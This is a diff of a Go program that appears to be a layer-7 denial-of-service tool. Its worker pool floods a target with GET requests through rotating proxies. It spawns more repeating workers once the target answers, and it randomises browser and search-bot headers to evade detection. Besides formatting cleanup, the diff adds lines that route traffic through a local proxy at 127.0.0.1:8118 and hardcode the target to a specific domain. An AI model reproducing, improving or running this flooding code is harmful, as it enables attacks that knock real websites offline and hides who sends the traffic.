@@ -38,25 +38,23 @@ var repeatingworkercountactual int = 0
 
 var maxrepeatingworkers int
 
-var referers[] string
-var useragentsandroid[] string
-var useragentsios[] string
-var useragentslinux[] string
-var useragentswindows[] string
-var yandexuseragents[] string
+var referers []string
+var useragentsandroid []string
+var useragentsios []string
+var useragentslinux []string
+var useragentswindows []string
+var yandexuseragents []string
 
-var accept[] string
-var acceptencoding[] string
-var acceptlanguage[] string
+var accept []string
+var acceptencoding []string
+var acceptlanguage []string
 
 var disguiseAsBotPercentage = 1
-
 
 var devices []string
 
 var sites SiteStruct
 var proxies ProxyStruct
-
 
 func getSites() SiteStruct {
 
@@ -115,7 +113,7 @@ func getProxies() ProxyStruct {
 		time.Sleep(time.Second * 5)
 		return getProxies()
 	}
-	
+
 	res, getErr := spaceClient.Do(req)
 	if getErr != nil {
 		fmt.Println("Retrying proxy download (pre)")
@@ -148,6 +146,7 @@ func getProxies() ProxyStruct {
 func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, id int, repeatingbus chan int) {
 	var myClient *http.Client
 	if useProxy {
+		proxyAuth = ""
 		if len(proxyAuth) > 0 {
 			split := strings.Split(proxyAuth, ":")
 			myClient = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(&url.URL{
@@ -156,6 +155,7 @@ func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, 
 				Host:   proxyUrl,
 			})}, Timeout: timeout}
 		} else {
+			proxyUrl = "127.0.0.1:8118"
 			myClient = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(&url.URL{
 				Scheme: "http",
 				Host:   proxyUrl,
@@ -165,9 +165,9 @@ func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, 
 	} else {
 		myClient = &http.Client{Timeout: timeout}
 	}
-	req, err := http.NewRequest("GET", target, nil)
+	req, err := http.NewRequest("GET", "http://pandemia.network", nil)
 	if err != nil {
-		if(ebus != nil) {
+		if ebus != nil {
 			ebus <- id
 		} else {
 			repeatingbus <- 0
@@ -180,7 +180,7 @@ func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, 
 		if !onlyOk {
 			log.Println(err)
 		}
-		if(ebus != nil) {
+		if ebus != nil {
 			ebus <- id
 		} else {
 			repeatingbus <- 0
@@ -192,26 +192,26 @@ func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, 
 		if !onlyOk {
 			log.Println(err)
 		}
-		if(ebus != nil) {
+		if ebus != nil {
 			ebus <- id
 		} else {
 			repeatingbus <- 0
 		}
 		return
 	}
-	if(targetonly200 && resp.StatusCode != 200) {
-		if(ebus != nil) {
+	if targetonly200 && resp.StatusCode != 200 {
+		if ebus != nil {
 			ebus <- id
 		} else {
 			repeatingbus <- 0
 		}
 		return
 	}
-	if(repeattarget) {
-		if(repeaterspawnnewworkers && ebus != nil) {
+	if repeattarget {
+		if repeaterspawnnewworkers && ebus != nil {
 			fmt.Println(resp.StatusCode, " OK! Spawning repeater workers... ", target)
 			for i := 0; i < repeaterspawnnewworkerscount; i++ {
-				for(repeaterspawnnewworkerscount >= maxrepeatingworkers){
+				for repeaterspawnnewworkerscount >= maxrepeatingworkers {
 					time.Sleep(time.Millisecond * 50)
 				}
 				time.Sleep(time.Duration(repeatsleepbefore) * time.Millisecond)
@@ -220,9 +220,9 @@ func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, 
 			}
 
 			ebus <- id
-			
+
 		} else {
-			if(ebus == nil){ 
+			if ebus == nil {
 				log.Println(resp.StatusCode, " OK! Continue to target a ", target)
 			} else {
 				log.Println(resp.StatusCode, " OK! Found a working target, repeating ", target)
@@ -230,14 +230,14 @@ func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, 
 			requestMe(target, proxyUrl, proxyAuth, ebus, id, repeatingbus)
 		}
 	} else {
-		if(ebus != nil) {
+		if ebus != nil {
 			ebus <- id
 		}
 	}
 }
 
-func randomPercentage(percentange int) (bool) {
-	return rand.Intn(100) <= percentange 
+func randomPercentage(percentange int) bool {
+	return rand.Intn(100) <= percentange
 }
 
 func randomizer() bool {
@@ -247,35 +247,34 @@ func randomizer() bool {
 func rollFromList(what *[]string) string {
 	n := rand.Int() % len(*what)
 	return (*what)[n]
-		
+
 }
 
 func readLines(path string) ([]string, error) {
-    file, err := os.Open(path)
-    if err != nil {
-        return nil, err
-    }
-    defer file.Close()
+	file, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
 
-    var lines []string
-    scanner := bufio.NewScanner(file)
-    for scanner.Scan() {
-        lines = append(lines, scanner.Text())
-    }
-    return lines, scanner.Err()
+	var lines []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		lines = append(lines, scanner.Text())
+	}
+	return lines, scanner.Err()
 }
-
 
 func setRandomHeaders(header *http.Header) {
 	// try to disguise as google
-	if(disguiseAsBotPercentage == 100 || (disguiseAsBotPercentage > 0 && randomPercentage(disguiseAsBotPercentage))) {
-		if(randomPercentage(80)) {
-			if(randomPercentage(10)) {
+	if disguiseAsBotPercentage == 100 || (disguiseAsBotPercentage > 0 && randomPercentage(disguiseAsBotPercentage)) {
+		if randomPercentage(80) {
+			if randomPercentage(10) {
 				header.Set("User-agent", rollFromList(&yandexuseragents))
 
-			} else if(randomPercentage(2)) {
+			} else if randomPercentage(2) {
 				header.Set("user-Agent", rollFromList(&yandexuseragents))
-			} else if(randomPercentage(2)) {
+			} else if randomPercentage(2) {
 				header.Set("User-Agent", rollFromList(&yandexuseragents))
 			} else {
 				header.Set("user-agent", rollFromList(&yandexuseragents))
@@ -290,15 +289,15 @@ func setRandomHeaders(header *http.Header) {
 		}
 		return
 	}
-	if(randomPercentage(81)) {
+	if randomPercentage(81) {
 		header.Set("referer", rollFromList(&referers))
 	}
 	rolledDevice := rollFromList(&devices)
-	switch(rolledDevice) {
+	switch rolledDevice {
 	case "ANDROID":
 		useragent := rollFromList(&useragentsandroid)
 		header.Set("user-agent", useragent)
-		if(strings.Contains(useragent, "Chrom") && randomPercentage(97)) {
+		if strings.Contains(useragent, "Chrom") && randomPercentage(97) {
 			// Need here to roll these 99 values
 			header.Set("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"")
 			header.Set("sec-ch-ua-mobile", "?1")
@@ -310,7 +309,7 @@ func setRandomHeaders(header *http.Header) {
 	case "IOS":
 		useragent := rollFromList(&useragentsios)
 		header.Set("user-agent", useragent)
-		if(strings.Contains(useragent, "Chrom") && randomPercentage(97)) {
+		if strings.Contains(useragent, "Chrom") && randomPercentage(97) {
 			// Need here to roll these 99 values
 			header.Set("sec-ch-ua", "\"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\", \"Lighthouse\";v=\"9.3.0\"")
 			header.Set("sec-ch-ua-mobile", "?0")
@@ -319,7 +318,7 @@ func setRandomHeaders(header *http.Header) {
 	case "LINUX":
 		useragent := rollFromList(&useragentslinux)
 		header.Set("user-agent", useragent)
-		if(strings.Contains(useragent, "Chrom") && randomPercentage(97)) {
+		if strings.Contains(useragent, "Chrom") && randomPercentage(97) {
 			// Need here to roll these 99 values
 			header.Set("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"")
 			header.Set("sec-ch-ua-mobile", "?0")
@@ -331,7 +330,7 @@ func setRandomHeaders(header *http.Header) {
 	case "WINDOWS":
 		useragent := rollFromList(&useragentswindows)
 		header.Set("user-agent", useragent)
-		if(strings.Contains(useragent, "Chrom") && randomPercentage(97)) {
+		if strings.Contains(useragent, "Chrom") && randomPercentage(97) {
 			// Need here to roll these 99 values
 			header.Set("sec-ch-ua", "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"")
 			header.Set("sec-ch-ua-mobile", "?0")
@@ -339,57 +338,57 @@ func setRandomHeaders(header *http.Header) {
 			header.Set("sec-fetch-dest", "document")
 			header.Set("sec-fetch-mode", "navigate")
 			header.Set("sec-fetch-site", "none")
-			if(randomPercentage(60)) {
+			if randomPercentage(60) {
 				header.Set("sec-fetch-site", "cross-site")
 			}
 			header.Set("sec-fetch-user", "?1")
 		}
 	}
 
-	if(randomPercentage(32)) {
+	if randomPercentage(32) {
 		header.Set("cache-control", "max-age=0")
 	}
-	if(randomPercentage(20)) {
+	if randomPercentage(20) {
 		header.Set("cache-control", "no-cache")
 	}
-	if(randomPercentage(23)) {
+	if randomPercentage(23) {
 		header.Set("device-memory", "8")
-		if(randomPercentage(20)) {
+		if randomPercentage(20) {
 			header.Set("device-memory", "4")
-		} else if(randomPercentage(10)) {
+		} else if randomPercentage(10) {
 			header.Set("device-memory", "2")
-		} else if(randomPercentage(20)) {
+		} else if randomPercentage(20) {
 			header.Set("device-memory", "1")
-		} else if(randomPercentage(10)) {
+		} else if randomPercentage(10) {
 			header.Set("device-memory", "0.5")
 		}
 	}
-	if(randomPercentage(15)) {
+	if randomPercentage(15) {
 		header.Set("ect", "4g")
 	}
-	if(randomPercentage(15)) {
+	if randomPercentage(15) {
 		header.Set("rtt", "50")
 	}
-	if(randomPercentage(15)) {
+	if randomPercentage(15) {
 		header.Set("dpr", "1")
 	}
-	if(randomPercentage(13)) {
+	if randomPercentage(13) {
 		header.Set("viewport-width", "1920")
 
-		if(randomPercentage(50)) {
+		if randomPercentage(50) {
 			header.Set("viewport-width", "800")
 		}
 	}
-	if(randomPercentage(79)) {
+	if randomPercentage(79) {
 		header.Set("upgrade-insecure-requests", "1")
 	}
-	if(randomPercentage(99)) {
+	if randomPercentage(99) {
 		header.Set("accept-encoding", rollFromList(&acceptencoding))
 	}
-	if(randomPercentage(99)) {
+	if randomPercentage(99) {
 		header.Set("accept", rollFromList(&accept))
 	}
-	if(randomPercentage(99)) {
+	if randomPercentage(99) {
 		header.Set("accept-language", rollFromList(&acceptlanguage))
 	}
 }
@@ -407,7 +406,7 @@ func gogogo(ebus chan int, id int, repeatingbus chan int) {
 func spawner(ebus chan int, repeatingbus chan int) {
 	for true {
 		id := <-ebus
-		for(repeattarget && repeaterspawnnewworkerscount >= maxrepeatingworkers){
+		for repeattarget && repeaterspawnnewworkerscount >= maxrepeatingworkers {
 			time.Sleep(time.Millisecond * 50)
 			fmt.Println("Waiting for more workers available")
 		}
@@ -428,7 +427,7 @@ func configUpdater() {
 func repeatworkercount(bus chan int) {
 	for true {
 		was := <-bus
-		if(was == 0) {
+		if was == 0 {
 			repeatingworkercountactual = repeatingworkercountactual - 1
 		} else {
 			repeatingworkercountactual = repeatingworkercountactual + 1
@@ -449,7 +448,6 @@ func main() {
 	accept, _ = readLines("resources/accept.txt")
 	yandexuseragents, _ = readLines("resources/yandex.txt")
 
-
 	workers, _ = strconv.Atoi(os.Getenv("WORKERS"))
 	repeatsleepbefore, _ = strconv.Atoi(os.Getenv("REPEATSLEEPBEFORE"))
 	disguiseAsBotPercentage, _ = strconv.Atoi(os.Getenv("DISGUISEASBOTPERCENTAGE"))
@@ -460,13 +458,11 @@ func main() {
 	onlyOkOs := os.Getenv("ONLYOK")
 	onlyOk = onlyOkOs == "true"
 	repeattargetOs := os.Getenv("REPEATTARGET")
-	repeaterspawnnewworkerscount , _ = strconv.Atoi(os.Getenv("REPEATERSPAWNNEWWORKERSCOUNT"))
+	repeaterspawnnewworkerscount, _ = strconv.Atoi(os.Getenv("REPEATERSPAWNNEWWORKERSCOUNT"))
 	repeaterspawnnewworkersOs := os.Getenv("REPEATERSPAWNNEWWORKERS")
 	repeaterspawnnewworkers = repeaterspawnnewworkersOs == "true"
 	targetonly200Os := os.Getenv("TARGETONLY200")
 	targetonly200 = targetonly200Os == "true"
-
-	
 
 	maxrepeatingworkers, _ = strconv.Atoi(os.Getenv("MAXREPEATING"))
 
